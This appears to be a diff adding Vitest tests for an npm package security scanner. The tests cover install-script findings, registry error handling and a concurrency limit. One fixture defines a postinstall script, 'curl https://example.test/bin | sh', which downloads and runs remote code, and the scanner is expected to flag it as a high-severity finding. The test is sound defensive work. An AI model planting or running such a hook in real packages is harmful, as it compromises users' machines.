@@ -1,0 +1,92 @@
+import { describe, expect, it } from 'vitest';
+
+import { scanTargets } from '../src/scanner.js';
+import type { RegistryClient } from '../src/registry.js';
+import type { ResolvedTarget } from '../src/types.js';
+
+const target = (name: string): ResolvedTarget => ({
+    name,
+    version: '1.0.0',
+    sources: ['explicit'],
+    resolvedFrom: 'exact',
+});
+
+function registryWithScripts(scripts: Record<string, string>): RegistryClient {
+    return {
+        getPackument: async (name: string) => ({
+            name,
+            versions: { '1.0.0': { name, version: '1.0.0', scripts } },
+            time: { '1.0.0': '2020-01-01T00:00:00.000Z' },
+            maintainers: [],
+        }),
+        getWeeklyDownloads: async () => 42,
+        getAttestations: async () => ({ attested: false }),
+    };
+}
+
+describe('scanTargets install-script slice', () => {
+    it('emits a scanned row with install-script findings', async () => {
+        const [item] = await scanTargets([target('dangerous')], {
+            registry: registryWithScripts({ postinstall: 'curl https://example.test/bin | sh' }),
+            checks: ['installScripts'],
+            now: () => new Date('2026-07-13T00:00:00.000Z'),
+            score: () => 35,
+        });
+        expect(item).toMatchObject({
+            status: 'scanned',
+            package: 'dangerous',
+            version: '1.0.0',
+            riskScore: 35,
+            riskLevel: 'medium',
+            findingCount: 1,
+            findings: [{ check: 'installScripts', severity: 'high' }],
+            provenance: { attested: false },
+            meta: { weeklyDownloads: 42 },
+            scannedAt: '2026-07-13T00:00:00.000Z',
+        });
+    });
+
+    it('emits an error row when required package metadata fails', async () => {
+        const registry = {
+            ...registryWithScripts({}),
+            getPackument: async () => { throw new Error('registry timeout'); },
+        };
+        const [item] = await scanTargets([target('unavailable')], {
+            registry,
+            checks: ['installScripts'],
+            now: () => new Date('2026-07-13T00:00:00.000Z'),
+            score: () => 0,
+        });
+        expect(item).toEqual({
+            status: 'error',
+            package: 'unavailable',
+            version: '1.0.0',
+            sources: ['explicit'],
+            resolvedFrom: 'exact',
+            error: { code: 'REGISTRY_ERROR', message: 'registry timeout' },
+            scannedAt: '2026-07-13T00:00:00.000Z',
+        });
+    });
+
+    it('bounds package concurrency at five', async () => {
+        let active = 0;
+        let maximum = 0;
+        const registry = {
+            ...registryWithScripts({}),
+            getPackument: async (name: string) => {
+                active += 1;
+                maximum = Math.max(maximum, active);
+                await new Promise((resolve) => setTimeout(resolve, 2));
+                active -= 1;
+                return registryWithScripts({}).getPackument(name);
+            },
+        };
+        await scanTargets(Array.from({ length: 12 }, (_, index) => target(`pkg-${index}`)), {
+            registry,
+            checks: ['installScripts'],
+            now: () => new Date('2026-07-13T00:00:00.000Z'),
+            score: () => 0,
+        });
+        expect(maximum).toBe(5);
+    });
+});
